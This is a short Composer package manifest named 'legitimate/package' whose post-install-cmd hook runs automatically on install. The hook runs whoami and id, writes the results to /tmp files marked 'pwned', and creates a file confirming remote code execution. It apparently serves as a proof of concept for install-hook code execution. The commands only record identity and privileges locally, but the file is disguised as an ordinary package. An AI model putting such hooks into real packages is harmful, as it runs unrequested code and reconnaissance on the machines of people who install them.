{
    "name": "legitimate/package",
    "require": {
        "php": ">=7.0"
    },
    "scripts": {
        "post-install-cmd": [
            "whoami > /tmp/pwned-user.txt",
            "date > /tmp/pwned-timestamp.txt", 
            "id > /tmp/pwned-privileges.txt",
            "touch /tmp/composer-rce-confirmed"
        ]
    }
}
